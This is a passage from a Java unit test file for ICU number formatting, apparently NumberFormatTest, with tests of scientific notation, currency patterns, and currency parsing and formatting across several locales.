\"1.23E300\", \"-3.1416E-271\",\n                // 00.000E00\n                \"12.340E-03\", \"12.346E07\", \"12.300E299\", \"-31.416E-272\",\n                // ##0.######E000\n                \"12.34E-003\", \"123.4568E006\", \"1.23E300\", \"-314.1593E-273\",\n                // 0.###E0;[0.###E0]\n                \"1.234E-2\", \"1.235E8\", \"1.23E300\", \"[3.142E-271]\" };\n        /*double valParse[] =\n            {\n                0.01234, 123460000, 1.23E300, -3.1416E-271,\n                0.01234, 123460000, 1.23E300, -3.1416E-271,\n                0.01234, 123456800, 1.23E300, -3.141593E-271,\n                0.01234, 123500000, 1.23E300, -3.142E-271,\n            };*/ //The variable is never used\n\n        int lval[] = { 0, -1, 1, 123456789 };\n        int lval_length = lval.length;\n        final String lvalFormat[] = {\n                // 0.####E0\n                \"0E0\", \"-1E0\", \"1E0\", \"1.2346E8\",\n                // 00.000E00\n                \"00.000E00\", \"-10.000E-01\", \"10.000E-01\", \"12.346E07\",\n                // ##0.######E000\n                \"0E000\", \"-1E000\", \"1E000\", \"123.4568E006\",\n                // 0.###E0;[0.###E0]\n                \"0E0\", \"[1E0]\", \"1E0\", \"1.235E8\" };\n        int lvalParse[] =\n            {\n                0, -1, 1, 123460000,\n                0, -1, 1, 123460000,\n                0, -1, 1, 123456800,\n                0, -1, 1, 123500000,\n            };\n        int ival = 0, ilval = 0;\n        for (int p = 0; p < pat_length; ++p) {\n            DecimalFormat fmt = new DecimalFormat(pat[p], sym);\n            logln(\"Pattern \\\"\" + pat[p] + \"\\\" -toPattern-> \\\"\" + fmt.toPattern() + \"\\\"\");\n            int v;\n            for (v = 0; v < val_length; ++v) {\n                String s;\n                s = ((NumberFormat) fmt).format(val[v]);\n                logln(\" \" + val[v] + \" -format-> \" + s);\n                if (!s.equals(valFormat[v + ival]))\n                    errln(\"FAIL: Expected \" + valFormat[v + ival]);\n\n                ParsePosition pos = new ParsePosition(0);\n                double a = fmt.parse(s, pos).doubleValue();\n                if (pos.getIndex() == s.length()) {\n                    logln(\"  -parse-> \" + Double.toString(a));\n                    // Use epsilon comparison as necessary\n                } else\n                    errln(\"FAIL: Partial parse (\" + pos.getIndex() + \" chars) -> \" + a);\n            }\n            for (v = 0; v < lval_length; ++v) {\n                String s;\n                s = ((NumberFormat) fmt).format(lval[v]);\n                logln(\" \" + lval[v] + \"L -format-> \" + s);\n                if (!s.equals(lvalFormat[v + ilval]))\n                    errln(\"ERROR: Expected \" + lvalFormat[v + ilval] + \" Got: \" + s);\n\n                ParsePosition pos = new ParsePosition(0);\n                long a = 0;\n                Number A = fmt.parse(s, pos);\n                if (A != null) {\n                    a = A.longValue();\n                    if (pos.getIndex() == s.length()) {\n                        logln(\"  -parse-> \" + a);\n                        if (a != lvalParse[v + ilval])\n                            errln(\"FAIL: Expected \" + lvalParse[v + ilval]);\n                    } else\n                        errln(\"FAIL: Partial parse (\" + pos.getIndex() + \" chars) -> \" + Long.toString(a));\n                } else {\n                    errln(\"Fail to parse the string: \" + s);\n                }\n            }\n            ival += val_length;\n            ilval += lval_length;\n        }\n    }\n\n    // Test the handling of quotes\n    @Test\n    public void TestQuotes() {\n\n        StringBuffer pat;\n        DecimalFormatSymbols sym = new DecimalFormatSymbols(Locale.US);\n        pat = new StringBuffer(\"a'fo''o'b#\");\n        DecimalFormat fmt = new DecimalFormat(pat.toString(), sym);\n        String s = ((NumberFormat)fmt).format(123);\n        logln(\"Pattern \\\"\" + pat + \"\\\"\");\n        logln(\" Format 123 . \" + s);\n        if (!s.equals(\"afo'ob123\"))\n            errln(\"FAIL: Expected afo'ob123\");\n\n        s =\"\";\n        pat = new StringBuffer(\"a''b#\");\n        fmt = new DecimalFormat(pat.toString(), sym);\n        s = ((NumberFormat)fmt).format(123);\n        logln(\"Pattern \\\"\" + pat + \"\\\"\");\n        logln(\" Format 123 . \" + s);\n        if (!s.equals(\"a'b123\"))\n            errln(\"FAIL: Expected a'b123\");\n    }\n\n    @Test\n    public void TestParseCurrencyTrailingSymbol() {\n        // see sun bug 4709840\n        NumberFormat fmt = NumberFormat.getCurrencyInstance(Locale.GERMANY);\n        float val = 12345.67f;\n        String str = fmt.format(val);\n        logln(\"val: \" + val + \" str: \" + str);\n        try {\n            Number num = fmt.parse(str);\n            logln(\"num: \" + num);\n        } catch (ParseException e) {\n            errln(\"parse of '\" + str + \"' threw exception: \" + e);\n        }\n    }\n\n    /**\n     * Test the handling of the currency symbol in patterns.\n     **/\n    @Test\n    public void TestCurrencySign() {\n        DecimalFormatSymbols sym = new DecimalFormatSymbols(Locale.US);\n        StringBuffer pat = new StringBuffer(\"\");\n        char currency = 0x00A4;\n        // \"\\xA4#,##0.00;-\\xA4#,##0.00\"\n        pat.append(currency).append(\"#,##0.00;-\").append(currency).append(\"#,##0.00\");\n        DecimalFormat fmt = new DecimalFormat(pat.toString(), sym);\n        String s = ((NumberFormat) fmt).format(1234.56);\n        pat = new StringBuffer();\n        logln(\"Pattern \\\"\" + fmt.toPattern() + \"\\\"\");\n        logln(\" Format \" + 1234.56 + \" . \" + s);\n        assertEquals(\"symbol, pos\", \"$1,234.56\", s);\n\n        s = ((NumberFormat) fmt).format(-1234.56);\n        logln(\" Format \" + Double.toString(-1234.56) + \" . \" + s);\n        assertEquals(\"symbol, neg\", \"-$1,234.56\", s);\n\n        pat.setLength(0);\n        // \"\\xA4\\xA4 #,##0.00;\\xA4\\xA4 -#,##0.00\"\n        pat.append(currency).append(currency).append(\" #,##0.00;\").append(currency).append(currency).append(\" -#,##0.00\");\n        fmt = new DecimalFormat(pat.toString(), sym);\n        s = ((NumberFormat) fmt).format(1234.56);\n        logln(\"Pattern \\\"\" + fmt.toPattern() + \"\\\"\");\n        logln(\" Format \" + Double.toString(1234.56) + \" . \" + s);\n        assertEquals(\"name, pos\", \"USD 1,234.56\", s);\n\n        s = ((NumberFormat) fmt).format(-1234.56);\n        logln(\" Format \" + Double.toString(-1234.56) + \" . \" + s);\n        assertEquals(\"name, neg\", \"USD -1,234.56\", s);\n    }\n\n    @Test\n    public void TestSpaceParsing() {\n        // the data are:\n        // the string to be parsed, parsed position, parsed error index\n        String[][] DATA = {\n                {\"$124\", \"4\", \"-1\"},\n                {\"$124 $124\", \"4\", \"-1\"},\n                {\"$124 \", \"4\", \"-1\"},\n                {\"$124  \", \"4\", \"-1\"},\n                {\"$ 124 \", \"5\", \"-1\"},\n                {\"$\\u00A0124 \", \"5\", \"-1\"},\n                {\" $ 124 \", \"6\", \"-1\"},\n                {\"124$\", \"4\", \"-1\"},\n                {\"124 $\", \"5\", \"-1\"},\n                {\"$124\\u200A\", \"4\", \"-1\"},\n                {\"$\\u200A124\", \"5\", \"-1\"},\n        };\n        NumberFormat foo = NumberFormat.getCurrencyInstance();\n        for (int i = 0; i < DATA.length; ++i) {\n            ParsePosition parsePosition = new ParsePosition(0);\n            String stringToBeParsed = DATA[i][0];\n            int parsedPosition = Integer.parseInt(DATA[i][1]);\n            int errorIndex = Integer.parseInt(DATA[i][2]);\n            try {\n                Number result = foo.parse(stringToBeParsed, parsePosition);\n                if (parsePosition.getIndex() != parsedPosition ||\n                        parsePosition.getErrorIndex() != errorIndex) {\n                    errln(\"FAILED parse \" + stringToBeParsed + \"; parse position: \" + parsePosition.getIndex() + \"; error position: \" + parsePosition.getErrorIndex());\n                }\n                if (parsePosition.getErrorIndex() == -1 &&\n                        result.doubleValue() != 124) {\n                    errln(\"FAILED parse \" + stringToBeParsed + \"; value \" + result.doubleValue());\n                }\n            } catch (Exception e) {\n                errln(\"FAILED \" + e.toString());\n            }\n        }\n    }\n\n    @Test\n    public void TestSpaceParsingStrict() {\n        // All trailing grouping separators should be ignored in strict mode, not just the first.\n        Object[][] cases = {\n                {\"123 \", 3, -1},\n                {\"123  \", 3, -1},\n                {\"123  ,\", 3, -1},\n                {\"123,\", 3, -1},\n                {\"123, \", 3, -1},\n                {\"123,,\", 3, -1},\n                {\"123,, \", 3, -1},\n                {\"123,,456\", 3, -1},\n                {\"123 ,\", 3, -1},\n                {\"123, \", 3, -1},\n                {\"123, 456\", 3, -1},\n                {\"123  456\", 3, -1}\n        };\n        DecimalFormat df = new DecimalFormat(\"#,###\");\n        df.setParseStrict(true);\n        for (Object[] cas : cases) {\n            String input = (String) cas[0];\n            int expectedIndex = (Integer) cas[1];\n            int expectedErrorIndex = (Integer) cas[2];\n            ParsePosition ppos = new ParsePosition(0);\n            df.parse(input, ppos);\n            assertEquals(\"Failed on index: '\" + input + \"'\", expectedIndex, ppos.getIndex());\n            assertEquals(\"Failed on error: '\" + input + \"'\", expectedErrorIndex, ppos.getErrorIndex());\n        }\n    }\n\n    @Test\n    public void TestMultiCurrencySign() {\n        String[][] DATA = {\n                // the fields in the following test are:\n                // locale,\n                // currency pattern (with negative pattern),\n                // currency number to be formatted,\n                // currency format using currency symbol name, such as \"$\" for USD,\n                // currency format using currency ISO name, such as \"USD\",\n                // currency format using plural name, such as \"US dollars\".\n                // for US locale\n                {\"en_US\", \"\\u00A4#,##0.00;-\\u00A4#,##0.00\", \"1234.56\", \"$1,234.56\", \"USD 1,234.56\", \"US dollars 1,234.56\"},\n                {\"en_US\", \"\\u00A4#,##0.00;-\\u00A4#,##0.00\", \"-1234.56\", \"-$1,234.56\", \"-USD 1,234.56\", \"-US dollars 1,234.56\"},\n                {\"en_US\", \"\\u00A4#,##0.00;-\\u00A4#,##0.00\", \"1\", \"$1.00\", \"USD 1.00\", \"US dollars 1.00\"},\n                // for CHINA locale\n                {\"zh_CN\", \"\\u00A4#,##0.00;(\\u00A4#,##0.00)\", \"1234.56\", \"\\uFFE51,234.56\", \"CNY 1,234.56\", \"\\u4EBA\\u6C11\\u5E01 1,234.56\"},\n                {\"zh_CN\", \"\\u00A4#,##0.00;(\\u00A4#,##0.00)\", \"-1234.56\", \"(\\uFFE51,234.56)\", \"(CNY 1,234.56)\", \"(\\u4EBA\\u6C11\\u5E01 1,234.56)\"},\n                {\"zh_CN\", \"\\u00A4#,##0.00;(\\u00A4#,##0.00)\", \"1\", \"\\uFFE51.00\", \"CNY 1.00\", \"\\u4EBA\\u6C11\\u5E01 1.00\"}\n        };\n\n        String doubleCurrencyStr = \"\\u00A4\\u00A4\";\n        String tripleCurrencyStr = \"\\u00A4\\u00A4\\u00A4\";\n\n        for (int i=0; i<DATA.length; ++i) {\n            String locale = DATA[i][0];\n            String pat = DATA[i][1];\n            Double numberToBeFormat = new Double(DATA[i][2]);\n            DecimalFormatSymbols sym = new DecimalFormatSymbols(new ULocale(locale));\n            for (int j=1; j<=3; ++j) {\n                // j represents the number of currency sign in the pattern.\n                if (j == 2) {\n                    pat = pat.replaceAll(\"\\u00A4\", doubleCurrencyStr);\n                } else if (j == 3) {\n                    pat = pat.replaceAll(\"\\u00A4\\u00A4\", tripleCurrencyStr);\n                }\n                DecimalFormat fmt = new DecimalFormat(pat, sym);\n                String s = ((NumberFormat) fmt).format(numberToBeFormat);\n                // DATA[i][3] is the currency format result using a\n                // single currency sign.\n                // DATA[i][4] is the currency format result using\n                // double currency sign.\n                // DATA[i][5] is the currency format result using\n                // triple currency sign.\n                // DATA[i][j+2] is the currency format result using\n                // 'j' number of currency sign.\n                String currencyFormatResult = DATA[i][2+j];\n                if (!s.equals(currencyFormatResult)) {\n                    errln(\"FAIL format: Expected \" + currencyFormatResult + \" but got \" + s);\n                }\n                try {\n                    // mix style parsing\n                    for (int k=3; k<=4; ++k) {\n                        // DATA[i][3] is the currency format result using a\n                        // single currency sign.\n                        // DATA[i][4] is the currency format result using\n                        // double currency sign.\n                        // DATA[i][5] is the currency format result using\n                        // triple currency sign.\n                        // ICU 59: long name parsing requires currency mode.\n                        String oneCurrencyFormat = DATA[i][k];\n                        if (fmt.parse(oneCurrencyFormat).doubleValue() !=\n                                numberToBeFormat.doubleValue()) {\n                            errln(\"FAILED parse \" + oneCurrencyFormat);\n                        }\n                    }\n                } catch (ParseException e) {\n                    errln(\"FAILED, DecimalFormat parse currency: \" + e.toString());\n                }\n            }\n        }\n    }\n\n    @Test\n    public void TestCurrencyFormatForMixParsing() {\n        MeasureFormat curFmt = MeasureFormat.getCurrencyFormat(new ULocale(\"en_US\"));\n        String[] formats = {\n                \"$1,234.56\",  // string to be parsed\n                \"USD1,234.56\",\n                \"US dollars1,234.56\",\n                \"1,234.56 US dollars\"\n        };\n        try {\n            for (int i = 0; i < formats.length; ++i) {\n                String stringToBeParsed = formats[i];\n                CurrencyAmount parsedVal = (CurrencyAmount)curFmt.parseObject(stringToBeParsed);\n                Number val = parsedVal.getNumber();\n                if (!val.equals(new BigDecimal(\"1234.56\"))) {\n                    errln(\"FAIL: getCurrencyFormat of default locale (en_US) failed roundtripping the number. val=\" + val);\n                }\n                if (!parsedVal.getCurrency().equals(Currency.getInstance(\"USD\"))) {\n                    errln(\"FAIL: getCurrencyFormat of default locale (en_US) failed roundtripping the currency\");\n                }\n            }\n        } catch (ParseException e) {\n            errln(\"parse FAILED: \" + e.toString());\n        }\n    }\n\n\n    /** Starting in ICU 62, strict mode is actually strict with currency formats. */\n    @Test\n    public void TestMismatchedCurrencyFormatFail() {\n        DecimalFormat df = (DecimalFormat) NumberFormat.getCurrencyInstance(ULocale.ENGLISH);\n        assertEquals(\"Test assumes that currency sign is at the beginning\",\n                \"\\u00A4#,##0.00\",\n                df.toPattern());\n        // Should round-trip on the correct currency format:\n        expect2(df, 1.23, \"\\u00A41.23\");\n        df.setCurrency(Currency.getInstance(\"EUR\"));\n        expect2(df, 1.23, \"\\u20AC1.23\");\n        // Should parse with currency in the wrong place in lenient mode\n        df.setParseStrict(false);\n        expect(df, \"1.23\\u20AC\", 1.23);\n        expectParseCurrency(df, Currency.getInstance(\"EUR\"), \"1.23\\u20AC\");\n        // Should NOT parse with currency in the wrong place in STRICT mode\n        df.setParseStrict(true);\n        {\n            ParsePosition ppos = new ParsePosition(0);\n            df.parse(\"1.23\\u20AC\", ppos);\n            assertEquals(\"Should fail to parse\", 0, ppos.getIndex());\n        }\n        {\n            ParsePosition ppos = new ParsePosition(0);\n            df.parseCurrency(\"1.23\\u20AC\", ppos);\n            assertEquals(\"Should fail to parse currency\", 0, ppos.getIndex());\n        }\n    }\n\n    @Test\n    public void TestDecimalFormatCurrencyParse() {\n        // Locale.US\n        DecimalFormatSymbols sym = new DecimalFormatSymbols(Locale.US);\n        StringBuffer pat = new StringBuffer(\"\");\n        char currency = 0x00A4;\n        // \"\\xA4#,##0.00;-\\xA4#,##0.00\"\n        pat.append(currency).append(currency).append(currency).append(\"#,##0.00;-\").append(currency).append(currency).append(currency).append(\"#,##0.00\");\n        DecimalFormat fmt = new DecimalFormat(pat.toString(), sym);\n        String[][] DATA = {\n                // the data are:\n                // string to be parsed, the parsed result (number)\n                {\"$1.00\", \"1\"},\n                {\"USD1.00\", \"1\"},\n                {\"1.00 US dollar\", \"1\"},\n                {\"$1,234.56\", \"1234.56\"},\n                {\"USD1,234.56\", \"1234.56\"},\n                {\"1,234.56 US dollar\", \"1234.56\"},\n        };\n        try {\n            for (int i = 0; i < DATA.length; ++i) {\n                String stringToBeParsed = DATA[i][0];\n                double parsedResult = Double.parseDouble(DATA[i][1]);\n                Number num = fmt.parse(stringToBeParsed);\n                if (num.doubleValue() != parsedResult) {\n                    errln(\"FAIL parse: Expected \" + parsedResult);\n                }\n            }\n        } catch (ParseException e) {\n            errln(\"FAILED, DecimalFormat parse currency: \" + e.toString());\n        }\n    }\n\n    /**\n     * Test localized currency patterns.\n     */\n    @Test\n    public void TestCurrency() {\n        String[] DATA = {\n                \"fr\", \"CA\", \"\", \"1,50\\u00a0$\",\n                \"de\", \"DE\", \"\", \"1,50\\u00a0\\u20AC\",\n                \"de\", \"DE\", \"PREEURO\", \"1,50\\u00a0DM\",\n                \"fr\", \"FR\", \"\", \"1,50\\u00a0\\u20AC\",\n                \"fr\", \"FR\", \"PREEURO\", \"1,50\\u00a0F\",\n        };\n\n        for (int i=0; i<DATA.length; i+=4) {\n            Locale locale = new Locale(DATA[i], DATA[i+1], DATA[i+2]);\n            NumberFormat fmt = NumberFormat.getCurrencyInstance(locale);\n            String s = fmt.format(1.50);\n            if (s.equals(DATA[i+3])) {\n                logln(\"Ok: 1.50 x \" + locale + \" => \" + s);\n            } else {\n                logln(\"FAIL: 1.50 x \" + locale + \" => \" + s +\n                        \", expected \" + DATA[i+3]);\n            }\n        }\n\n        // format currency with CurrencyAmount\n        for (int i=0; i<DATA.length; i+=4) {\n            Locale locale = new Locale(DATA[i], DATA[i+1], DATA[i+2]);\n\n            Currency curr = Currency.getInstance(locale);\n            logln(\"\\nName of the currency is: \" + curr.getName(locale, Currency.LONG_NAME, new boolean[] {false}));\n            CurrencyAmount cAmt = new CurrencyAmount(1.5, curr);\n            logln(\"CurrencyAmount object's hashCode is: \" + cAmt.hashCode()); //cover hashCode\n\n            NumberFormat fmt = NumberFormat.getCurrencyInstance(locale);\n            String sCurr = fmt.format(cAmt);\n            if (sCurr.equals(DATA[i+3])) {\n                logln(\"Ok: 1.50 x \" + locale + \" => \" + sCurr);\n            } else {\n                errln(\"FAIL: 1.50 x \" + locale + \" => \" + sCurr +\n                        \", expected \" + DATA[i+3]);\n            }\n        }\n\n        //Cover MeasureFormat.getCurrencyFormat()\n        ULocale save = ULocale.getDefault();\n        ULocale.setDefault(ULocale.US);\n        MeasureFormat curFmt = MeasureFormat.getCurrencyFormat();\n        String strBuf = curFmt.format(new CurrencyAmount(new Float(1234.56), Currency.getInstance(\"USD\")));\n\n        try {\n            CurrencyAmount parsedVal = (CurrencyAmount)curFmt.parseObject(strBuf);\n            Number val = parsedVal.getNumber();\n            if (!val.equals(new BigDecimal(\"1234.56\"))) {\n                errln(\"FAIL: getCurrencyFormat of default locale (en_US) failed roundtripping the number. val=\" + val);\n            }\n            if (!parsedVal.getCurrency().equals(Currency.getInstance(\"USD\"))) {\n                errln(\"FAIL: getCurrencyFormat of default locale (en_US) failed roundtripping the currency\");\n            }\n        }\n        catch (ParseException e) {\n            errln(\"FAIL: \" + e.getMessage());\n        }\n        ULocale.setDefault(save);\n    }\n\n    @Test\n    public void TestJavaCurrencyConversion() {\n        java.util.Currency gbpJava = java.util.Currency.getInstance(\"GBP\");\n        Currency gbpIcu = Currency.getInstance(\"GBP\");\n        assertEquals(\"ICU should equal API value\", gbpIcu, Currency.fromJavaCurrency(gbpJava));\n        assertEquals(\"Java should equal API value\", gbpJava, gbpIcu.toJavaCurrency());\n        // Test CurrencyAmount constructors\n        CurrencyAmount ca1 = new CurrencyAmount(123.45, gbpJava);\n        CurrencyAmount ca2 = new CurrencyAmount(123.45, gbpIcu);\n        assertEquals(\"CurrencyAmount from both Double constructors should be equal\", ca1, ca2);\n        // Coverage for the Number constructor\n        ca1 = new CurrencyAmount(new BigDecimal(\"543.21\"), gbpJava);\n        ca2 = new CurrencyAmount(new BigDecimal(\"543.21\"), gbpIcu);\n        assertEquals(\"CurrencyAmount from both Number constructors should be equal\", ca1, ca2);\n    }\n\n    @Test\n    public void TestCurrencyIsoPluralFormat() {\n        String[][] DATA = {\n                // the data are:\n                // locale,\n                // currency amount to be formatted,\n                // currency ISO code to be formatted,\n                // format result using CURRENCYSTYLE,\n                // format result using ISOCURRENCYSTYLE,\n                // format result using PLURALCURRENCYSTYLE,\n                {\"en_US\", \"1\", \"USD\", \"$1.00\", \"USD 1.00\", \"1.00 US dollars\"},\n                {\"en_US\", \"1234.56\", \"USD\", \"$1,234.56\", \"USD 1,234.56\", \"1,234.56 US dollars\"},\n                {\"en_US\", \"-1234.56\", \"USD\", \"-$1,234.56\", \"-USD 1,234.56\", \"-1,234.56 US dollars\"},\n                {\"zh_CN\", \"1\", \"USD\", \"US$1.00\", \"USD 1.00\", \"1.00 美元\"},\n                {\"zh_CN\", \"1234.56\", \"USD\", \"US$1,234.56\", \"USD 1,234.56\", \"1,234.56 美元\"},\n                {\"zh_CN\", \"1\", \"CNY\", \"￥1.00\", \"CNY 1.00\", \"1.00 人民币\"},\n                {\"zh_CN\", \"1234.56\", \"CNY\", \"￥1,234.56\", \"CNY 1,234.56\", \"1,234.56 人民币\"},\n                {\"ru_RU\", \"1\", \"RUB\", \"1,00 \\u20BD\", \"1,00 RUB\", \"1,00 российского рубля\"},\n                {\"ru_RU\", \"2\", \"RUB\", \"2,00 \\u20BD\", \"2,00 RUB\", \"2,00 российского рубля\"},\n                {\"ru_RU\", \"5\", \"RUB\", \"5,00 \\u20BD\", \"5,00 RUB\", \"5,00 российского рубля\"},\n                // test locale without currency information\n                {\"root\", \"-1.23\", \"USD\", \"-US$ 1.23\", \"-USD 1.23\", \"-1.23 USD\"},\n                {\"root@numbers=latn\", \"-1.23\", \"USD\", \"-US$ 1.23\", \"-USD 1.23\", \"-1.23 USD\"}, // ensure that the root locale is still used with modifiers\n                {\"root@numbers=arab\", \"-1.23\", \"USD\", \"\\u061C-\\u0661\\u066B\\u0662\\u0663\\u00A0US$\", \"\\u061C-\\u0661\\u066B\\u0662\\u0663\\u00A0USD\", \"\\u061C-\\u0661\\u066B\\u0662\\u0663 USD\"}, // ensure that the root locale is still used with modifiers\n                {\"es_AR\", \"1\", \"INR\", \"INR\\u00A01,00\", \"INR\\u00A01,00\", \"1,00 rupia india\"},\n                {\"ar_EG\", \"1\", \"USD\", \"١٫٠٠\\u00A0US$\", \"١٫٠٠\\u00A0USD\", \"١٫٠٠ دولار أمريكي\"},\n        };\n\n        for (int i=0; i<DATA.length; ++i) {\n            for (int k = NumberFormat.CURRENCYSTYLE;\n                    k <= NumberFormat.PLURALCURRENCYSTYLE;\n                    ++k) {\n                // k represents currency format style.\n                if ( k != NumberFormat.CURRENCYSTYLE &&\n                        k != NumberFormat.ISOCURRENCYSTYLE &&\n                        k != NumberFormat.PLURALCURRENCYSTYLE ) {\n                    continue;\n                }\n                String localeString = DATA[i][0];\n                Double numberToBeFormat = new Double(DATA[i][1]);\n                String currencyISOCode = DATA[i][2];\n                ULocale locale = new ULocale(localeString);\n                NumberFormat numFmt = NumberFormat.getInstance(locale, k);\n                numFmt.setCurrency(Currency.getInstance(currencyISOCode));\n                String strBuf = numFmt.format(numberToBeFormat);\n                int resultDataIndex = k-1;\n                if ( k == NumberFormat.CURRENCYSTYLE ) {\n                    resultDataIndex = k+2;\n                }\n                // DATA[i][resultDataIndex] is the currency format result\n                // using 'k' currency style.\n                String formatResult = DATA[i][resultDataIndex];\n                if (!strBuf.equals(formatResult)) {\n                    errln(\"FAIL: localeID: \" + localeString + \", expected(\" + formatResult.length() + \"): \\\"\" + formatResult + \"\\\", actual(\" + strBuf.length() + \"): \\\"\" + strBuf + \"\\\"\");\n                }\n                // test parsing, and test parsing for all currency formats.\n                for (int j = 3; j < 6; ++j) {\n                    // DATA[i][3] is the currency format result using\n                    // CURRENCYSTYLE formatter.\n                    // DATA[i][4] is the currency format result using\n                    // ISOCURRENCYSTYLE formatter.\n                    // DATA[i][5] is the currency format result using\n                    // PLURALCURRENCYSTYLE formatter.\n                    String oneCurrencyFormatResult = DATA[i][j];\n                    CurrencyAmount val = numFmt.parseCurrency(oneCurrencyFormatResult, null);\n                    if (val.getNumber().doubleValue() != numberToBeFormat.doubleValue()) {\n                        errln(\"FAIL: getCurrencyFormat of locale \" + localeString + \" failed roundtripping the number. val=\" + val + \"; expected: \" + numberToBeFormat);\n                    }\n                }\n            }\n        }\n    }\n\n\n    @Test\n    public void TestMiscCurrencyParsing() {\n        String[][] DATA = {\n                // each has: string to be parsed, parsed position, error position\n                {\"1.00 \", \"4\", \"-1\", \"0\", \"4\"},\n                {\"1.00 UAE dirha\", \"4\", \"-1\", \"0\", \"4\"},\n                {\"1.00 us dollar\", \"14\", \"-1\", \"14\", \"-1\"},\n                {\"1.00 US DOLLAR\", \"14\", \"-1\", \"14\", \"-1\"},\n                {\"1.00 usd\", \"8\", \"-1\", \"8\", \"-1\"},\n                {\"1.00 USD\", \"8\", \"-1\", \"8\", \"-1\"},\n        };\n        ULocale locale = new ULocale(\"en_US\");\n        for (int i=0; i<DATA.length; ++i) {\n            String stringToBeParsed = DATA[i][0];\n            int parsedPosition = Integer.parseInt(DATA[i][1]);\n            int errorIndex = Integer.parseInt(DATA[i][2]);\n            int currParsedPosition = Integer.parseInt(DATA[i][3]);\n            int currErrorIndex = Integer.parseInt(DATA[i][4]);\n            NumberFormat numFmt = NumberFormat.getInstance(locale, NumberFormat.CURRENCYSTYLE);\n            ParsePosition parsePosition = new ParsePosition(0);\n            Number val = numFmt.parse(stringToBeParsed, parsePosition);\n            if (parsePosition.getIndex() != parsedPosition ||\n                    parsePosition.getErrorIndex() != errorIndex) {\n                errln(\"FAIL: parse failed on case \"+i+\". expected position: \" + parsedPosition +\"; actual: \" + parsePosition.getIndex());\n                errln(\"FAIL: parse failed on case \"+i+\". expected error position: \" + errorIndex + \"; actual: \" + parsePosition.getErrorIndex());\n            }\n            if (parsePosition.getErrorIndex() == -1 &&\n                    val.doubleValue() != 1.00) {\n                errln(\"FAIL: parse failed. expected 1.00, actual:\" + val);\n            }\n            parsePosition = new ParsePosition(0);\n            CurrencyAmount amt = numFmt.parseCurrency(stringToBeParsed, parsePosition);\n            if (parsePosition.getIndex() != currParsedPosition ||\n                    parsePosition.getErrorIndex() != currErrorIndex) {\n                errln(\"FAIL: parseCurrency failed on case \"+i+\". expected error position: \" + currErrorIndex + \"; actual: \" + parsePosition.getErrorIndex());\n                errln(\"FAIL: parseCurrency failed on case \"+i+\". expected position: \" + currParsedPosition +\"; actual: \" + parsePosition.getIndex());\n            }\n            if (parsePosition.getErrorIndex() == -1 &&\n                    amt.getNumber().doubleValue() != 1.00) {\n                errln(\"FAIL: parseCurrency failed. expected 1.00, actual:\" + val);\n            }\n        }\n    }\n\n    @Test\n    public void TestParseCurrency() {\n        class ParseCurrencyItem {\n            private final String localeString;\n            private final String descrip;\n            private final String currStr;\n            private final int    doubExpectPos;\n            private final int    doubExpectVal;\n            private final int    curExpectPos;\n            private final int    curExpectVal;\n            private final String curExpectCurr;\n\n            ParseCurrencyItem(String locStr, String desc, String curr, int doubExPos, int doubExVal, int curExPos, int curExVal, String curExCurr) {\n                localeString  = locStr;\n                descrip       = desc;\n                currStr       = curr;\n                doubExpectPos  = doubExPos;\n                doubExpectVal  = doubExVal;\n                curExpectPos  = curExPos;\n                curExpectVal  = curExVal;\n                curExpectCurr = curExCurr;\n            }\n            public String getLocaleString()  { return localeString; }\n            public String getDescrip()       { return descrip; }\n            public String getCurrStr()       { return currStr; }\n            public int    getDoubExpectPos()  { return doubExpectPos; }\n            public int    getDoubExpectVal()  { return doubExpectVal; }\n            public int    getCurExpectPos()  { return curExpectPos; }\n            public int    getCurExpectVal()  { return curExpectVal; }\n            public String getCurExpectCurr() { return curExpectCurr; }\n        }\n        // Note: In cases where the number occurs before the currency sign, non-currency mode will parse the number\n        // and stop when it reaches the currency symbol.\n        final ParseCurrencyItem[] parseCurrencyItems = {\n                new ParseCurrencyItem( \"en_US\", \"dollars2\", \"$2.00\",            5,  2,  5,  2,  \"USD\" ),\n                new ParseCurrencyItem( \"en_US\", \"dollars4\", \"$4\",               2,  4,  2,  4,  \"USD\" ),\n                new ParseCurrencyItem( \"en_US\", \"dollars9\", \"9\\u00A0$\",         3,  9,  3,  9,  \"USD\" ),\n                new ParseCurrencyItem( \"en_US\", \"pounds3\",  \"\\u00A33.00\",       0,  0,  5,  3,  \"GBP\" ),\n                new ParseCurrencyItem( \"en_US\", \"pounds5\",  \"\\u00A35\",          0,  0,  2,  5,  \"GBP\" ),\n                new ParseCurrencyItem( \"en_US\", \"pounds7\",  \"7\\u00A0\\u00A3\",    1,  7,  3,  7,  \"GBP\" ),\n                new ParseCurrencyItem( \"en_US\", \"euros8\",   \"\\u20AC8\",          0,  0,  2,  8,  \"EUR\" ),\n\n                new ParseCurrencyItem( \"en_GB\", \"pounds3\",  \"\\u00A33.00\",       5,  3,  5,  3,  \"GBP\" ),\n                new ParseCurrencyItem( \"en_GB\", \"pounds5\",  \"\\u00A35\",          2,  5,  2,  5,  \"GBP\" ),\n                new ParseCurrencyItem( \"en_GB\", \"pounds7\",  \"7\\u00A0\\u00A3\",    3,  7,  3,  7,  \"GBP\" ),\n                new ParseCurrencyItem( \"en_GB\", \"euros4\",   \"4,00\\u00A0\\u20AC\", 4,400,  6,400,  \"EUR\" ),\n                new ParseCurrencyItem( \"en_GB\", \"euros6\",   \"6\\u00A0\\u20AC\",    1,  6,  3,  6,  \"EUR\" ),\n                new ParseCurrencyItem( \"en_GB\", \"euros8\",   \"\\u20AC8\",          0,  0,  2,  8,  \"EUR\" ),\n                new ParseCurrencyItem( \"en_GB\", \"dollars4\", \"US$4\",             0,  0,  4,  4,  \"USD\" ),\n\n                new ParseCurrencyItem( \"fr_FR\", \"euros4\",   \"4,00\\u00A0\\u20AC\", 6,  4,  6,  4,  \"EUR\" ),\n                new ParseCurrencyItem( \"fr_FR\", \"euros6\",   \"6\\u00A0\\u20AC\",    3,  6,  3,  6,  \"EUR\" ),\n                new ParseCurrencyItem( \"fr_FR\", \"euros8\",   \"\\u20AC8\",          2,  8,  2,  8,  \"EUR\" ),\n                new ParseCurrencyItem( \"fr_FR\", \"dollars2\", \"$2.00\",            0,  0,  0,  0,  \"\"    ),\n                new ParseCurrencyItem( \"fr_FR\", \"dollars4\", \"$4\",               0,  0,  0,  0,  \"\"    ),\n        };\n        for (ParseCurrencyItem item: parseCurrencyItems) {\n            String localeString = item.getLocaleString();\n            ULocale uloc = new ULocale(localeString);\n            NumberFormat fmt = null;\n            try {\n                fmt = NumberFormat.getCurrencyInstance(uloc);\n            } catch (Exception e) {\n                errln(\"NumberFormat.getCurrencyInstance fails for locale \" + localeString);\n                